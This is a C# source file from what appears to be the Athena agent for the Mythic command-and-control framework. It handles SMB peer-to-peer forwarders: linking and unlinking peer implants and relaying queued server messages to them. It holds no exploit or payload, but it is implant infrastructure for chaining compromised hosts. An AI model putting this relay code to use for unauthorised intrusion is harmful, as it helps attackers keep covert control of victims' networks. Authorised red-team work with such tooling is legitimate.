using Athena.Forwarders;
using Athena.Models;
using Athena.Models.Comms.SMB;
using Athena.Models.Config;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Athena.Models.Responses;

namespace Athena.Handler.Common
{
    public class ForwarderHandler
    {
        ConcurrentDictionary<string, SMBForwarder> forwarders = new ConcurrentDictionary<string, SMBForwarder>();
        ConcurrentDictionary<string, SMBForwarder> tempForwarders = new ConcurrentDictionary<string, SMBForwarder>(); //Used to store before we know the "true" UUID of the fwd
        ConcurrentDictionary<string, ConcurrentQueue<DelegateMessage>> messageQueue = new ConcurrentDictionary<string, ConcurrentQueue<DelegateMessage>>();
        //SMBForwarder fwrdr = new SMBForwarder();

        public ForwarderHandler()
        {

        }

        public async Task<EdgeResponseResult> LinkForwarder(MythicJob job, string uuid, string agent_id)
        {
            Debug.WriteLine($"[{DateTime.Now}] Initiating forwarder link");
            string id = Guid.NewGuid().ToString();

            //Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);

            //switch (par["type"].ToLower())
            switch ("smb".ToLower())
            {
                case "smb":
                    //Generate temporary UUID so we're at least tracking something
                    this.tempForwarders.TryAdd(id, new SMBForwarder(id, agent_id));
                    //Add to our tracker
                    Debug.WriteLine($"[{DateTime.Now}] Added forwarder to temp tracker.");
                    EdgeResponseResult err = await this.tempForwarders[id].Link(job, uuid);

                    if(err.edges.Count > 0)
                    {
                        this.forwarders.TryAdd(err.edges.First().destination, this.tempForwarders[id]);
                        this.messageQueue.TryAdd(err.edges.First().destination, new ConcurrentQueue<DelegateMessage>());
                    }


                    Debug.WriteLine($"[{DateTime.Now}] New Edge Added: {err.edges.First().destination}");
                    //Figure out how to get proper ID's based on each thing
                    //Maybe add an event handler to update agent ids?

                    return err;
                default:
                    break;
            }

            return new EdgeResponseResult()
            {
                task_id = job.task.id,
                process_response = new Dictionary<string, string> { { "message", "0x17" } },
                completed = true,
                edges = new List<Edge>()
            };
        }

        public async Task<bool> UnlinkForwarder(MythicJob job)
        {
            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                return await this.forwarders[parameters["id"]].Unlink() && this.forwarders.TryRemove(parameters["id"], out _);
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> ListForwarders()
        {
            StringBuilder sb = new StringBuilder();
            foreach (var fwdr in this.forwarders)
            {
                sb.AppendLine($"ID: {fwdr.Value.id}\tType: {fwdr.Value.profile_type}\tConnected: {fwdr.Value.connected}");
            }
            return sb.ToString();
        }

        public async Task HandleDelegateMessages(List<DelegateMessage> messages)
        { 
            //If we're relinking to an agent, the old agent is forwarding its proper 
            foreach(var msg in messages)
            {
                string id = msg.uuid;
                Debug.WriteLine($"[{DateTime.Now}] Delegate from Mythic: {JsonSerializer.Serialize(msg, DelegateMessageJsonContext.Default.DelegateMessage)}");
                if (!string.IsNullOrEmpty(msg.new_uuid))
                {
                    Debug.WriteLine($"[{DateTime.Now}] Updating Agent ID - (new_uuid): {msg.new_uuid}\t(mythic_uuid): {msg.mythic_uuid}");
                    id = msg.new_uuid;
                    //msg.uuid = msg.new_uuid;
                }
                bool success = this.messageQueue.TryAdd(id, new ConcurrentQueue<DelegateMessage>());
                this.messageQueue[id].Enqueue(msg);
            }

            Parallel.ForEach(messageQueue, async queue =>
            {
                while (!queue.Value.IsEmpty)
                {
                    DelegateMessage dm;
                    if(!queue.Value.TryDequeue(out dm))
                    {
                        continue;
                    }
                    await HandleDelegate(dm);
                }                        
            });
        }

        private async Task<bool> HandleDelegate(DelegateMessage dm)
        {
            string id = dm.uuid;

            if (!string.IsNullOrEmpty(dm.new_uuid))
            {
                Debug.WriteLine($"[{DateTime.Now}] New UUID Received: {dm.new_uuid}");
                id = dm.new_uuid;
            }
            if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
            {
                Debug.WriteLine($"[{DateTime.Now}] Forwarder doesn't contain ID: {id}, finding out if it's in tempForwarders {this.tempForwarders.ContainsKey(id)}");
                SMBForwarder fwd;
                if (this.tempForwarders.TryRemove(dm.uuid, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
                {
                    this.forwarders.TryAdd(dm.new_uuid, fwd);
                    this.forwarders[dm.new_uuid].id = dm.new_uuid;
                    dm.uuid = dm.new_uuid;
                }
            }

            return await this.forwarders[id].ForwardDelegateMessage(dm);
        }
    }
}
